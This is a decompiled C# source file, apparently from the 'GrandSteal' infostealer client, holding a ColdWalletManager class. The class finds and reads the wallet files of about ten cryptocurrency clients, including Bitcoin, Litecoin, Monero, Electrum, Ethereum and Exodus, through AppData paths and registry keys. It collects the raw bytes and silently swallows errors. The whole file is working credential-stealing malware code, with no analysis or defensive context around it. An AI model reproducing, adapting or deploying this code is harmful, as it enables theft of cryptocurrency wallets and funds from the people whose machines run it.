using System;
using System.Collections.Generic;
using System.IO;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.SharedModels.Models;
using Microsoft.Win32;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x02000017 RID: 23
	public class ColdWalletManager : ICredentialsManager<ColdWallet>
	{
		// Token: 0x0600007C RID: 124 RVA: 0x00005478 File Offset: 0x00003678
		public List<ColdWallet> GetAll()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				ColdWallet coldWallet = this.GrabLitecoin();
				ColdWallet coldWallet2 = this.GrabBitcoinQt();
				ColdWallet coldWallet3 = this.GrabBitcoin();
				ColdWallet coldWallet4 = this.GrabDashQt();
				ColdWallet coldWallet5 = this.GrabLitecoinQt();
				ColdWallet coldWallet6 = this.GrabMonero();
				if (coldWallet != null)
				{
					list.Add(coldWallet);
				}
				if (coldWallet2 != null)
				{
					list.Add(coldWallet2);
				}
				if (coldWallet3 != null)
				{
					list.Add(coldWallet3);
				}
				if (coldWallet4 != null)
				{
					list.Add(coldWallet4);
				}
				if (coldWallet5 != null)
				{
					list.Add(coldWallet5);
				}
				if (coldWallet6 != null)
				{
					list.Add(coldWallet6);
				}
				foreach (ColdWallet current in (this.GrabBytecoin() ?? new List<ColdWallet>()))
				{
					if (current != null)
					{
						list.Add(current);
					}
				}
				foreach (ColdWallet current2 in (this.GrabElectrum() ?? new List<ColdWallet>()))
				{
					if (current2 != null)
					{
						list.Add(current2);
					}
				}
				foreach (ColdWallet current3 in (this.GrabEthereum() ?? new List<ColdWallet>()))
				{
					if (current3 != null)
					{
						list.Add(current3);
					}
				}
				foreach (ColdWallet current4 in (this.GrabExodus() ?? new List<ColdWallet>()))
				{
					if (current4 != null)
					{
						list.Add(current4);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00005698 File Offset: 0x00003898
		private ColdWallet GrabLitecoin()
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Litecoin\\wallet.dat";
				if (File.Exists(path))
				{
					byte[] array = File.ReadAllBytes(path);
					if (array != null)
					{
						return new ColdWallet
						{
							DataArray = array,
							WalletName = "Litecoin",
							Name = "wallet.dat"
						};
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00005708 File Offset: 0x00003908
		private ColdWallet GrabBitcoinQt()
		{
			try
			{
				RegistryKey expr_0F = Registry.CurrentUser.OpenSubKey("Software");
				RegistryKey arg_31_0;
				if (expr_0F == null)
				{
					arg_31_0 = null;
				}
				else
				{
					RegistryKey expr_20 = expr_0F.OpenSubKey("Bitcoin");
					arg_31_0 = ((expr_20 != null) ? expr_20.OpenSubKey("Bitcoin-Qt") : null);
				}
				using (RegistryKey registryKey = arg_31_0)
				{
					string path = ((registryKey != null) ? registryKey.GetValue("strDataDir").ToString() : null) + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Bitcoin-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x0600007F RID: 127 RVA: 0x000057D0 File Offset: 0x000039D0
		private ColdWallet GrabBitcoin()
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Bitcoin\\wallet.dat";
				if (File.Exists(path))
				{
					byte[] array = File.ReadAllBytes(path);
					if (array != null)
					{
						return new ColdWallet
						{
							DataArray = array,
							WalletName = "Bitcoin",
							Name = "wallet.dat"
						};
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00005840 File Offset: 0x00003A40
		private List<ColdWallet> GrabBytecoin()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin");
				if (directoryInfo.Exists)
				{
					FileInfo[] files = directoryInfo.GetFiles();
					for (int i = 0; i < files.Length; i++)
					{
						FileInfo fileInfo = files[i];
						if (fileInfo.Extension.Equals(".wallet"))
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									Name = fileInfo.Name,
									WalletName = "Bytecoin"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000081 RID: 129 RVA: 0x000058F4 File Offset: 0x00003AF4
		private List<ColdWallet> GrabExodus()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus\\exodus.wallet");
				if (directoryInfo.Exists)
				{
					FileInfo[] files = directoryInfo.GetFiles();
					for (int i = 0; i < files.Length; i++)
					{
						FileInfo fileInfo = files[i];
						byte[] array = File.ReadAllBytes(fileInfo.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								DataArray = array,
								Name = fileInfo.Name,
								WalletName = "Exodus"
							});
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00005994 File Offset: 0x00003B94
		private ColdWallet GrabDashQt()
		{
			try
			{
				RegistryKey expr_05 = Registry.CurrentUser;
				RegistryKey arg_38_0;
				if (expr_05 == null)
				{
					arg_38_0 = null;
				}
				else
				{
					RegistryKey expr_16 = expr_05.OpenSubKey("Software");
					if (expr_16 == null)
					{
						arg_38_0 = null;
					}
					else
					{
						RegistryKey expr_27 = expr_16.OpenSubKey("Dash");
						arg_38_0 = ((expr_27 != null) ? expr_27.OpenSubKey("Dash-Qt") : null);
					}
				}
				using (RegistryKey registryKey = arg_38_0)
				{
					string path = ((registryKey != null) ? registryKey.GetValue("strDataDir").ToString() : null) + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Dash-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00005A64 File Offset: 0x00003C64
		private List<ColdWallet> GrabElectrum()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets");
				if (directoryInfo.Exists)
				{
					FileInfo[] files = directoryInfo.GetFiles();
					for (int i = 0; i < files.Length; i++)
					{
						FileInfo fileInfo = files[i];
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									Name = fileInfo.Name,
									WalletName = "Electrum"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00005B0C File Offset: 0x00003D0C
		private List<ColdWallet> GrabEthereum()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\wallets");
				if (directoryInfo.Exists)
				{
					FileInfo[] files = directoryInfo.GetFiles();
					for (int i = 0; i < files.Length; i++)
					{
						FileInfo fileInfo = files[i];
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									Name = fileInfo.Name,
									WalletName = "Ethereum"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00005BB4 File Offset: 0x00003DB4
		private ColdWallet GrabLitecoinQt()
		{
			try
			{
				RegistryKey expr_05 = Registry.CurrentUser;
				RegistryKey arg_38_0;
				if (expr_05 == null)
				{
					arg_38_0 = null;
				}
				else
				{
					RegistryKey expr_16 = expr_05.OpenSubKey("Software");
					if (expr_16 == null)
					{
						arg_38_0 = null;
					}
					else
					{
						RegistryKey expr_27 = expr_16.OpenSubKey("Litecoin");
						arg_38_0 = ((expr_27 != null) ? expr_27.OpenSubKey("Litecoin-Qt") : null);
					}
				}
				using (RegistryKey registryKey = arg_38_0)
				{
					string path = ((registryKey != null) ? registryKey.GetValue("strDataDir").ToString() : null) + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Litecoin-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00005C84 File Offset: 0x00003E84
		private ColdWallet GrabMonero()
		{
			try
			{
				RegistryKey expr_05 = Registry.CurrentUser;
				RegistryKey arg_38_0;
				if (expr_05 == null)
				{
					arg_38_0 = null;
				}
				else
				{
					RegistryKey expr_16 = expr_05.OpenSubKey("Software");
					if (expr_16 == null)
					{
						arg_38_0 = null;
					}
					else
					{
						RegistryKey expr_27 = expr_16.OpenSubKey("monero-project");
						arg_38_0 = ((expr_27 != null) ? expr_27.OpenSubKey("monero-core") : null);
					}
				}
				using (RegistryKey registryKey = arg_38_0)
				{
					char[] separator = new char[]
					{
						'\\'
					};
					string text = (registryKey != null) ? registryKey.GetValue("wallet_path").ToString().Replace("/", "\\") : null;
					if (File.Exists(text))
					{
						byte[] array = File.ReadAllBytes(text);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Monero",
								Name = text.Split(separator)[text.Split(separator).Length - 1]
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}
	}
}
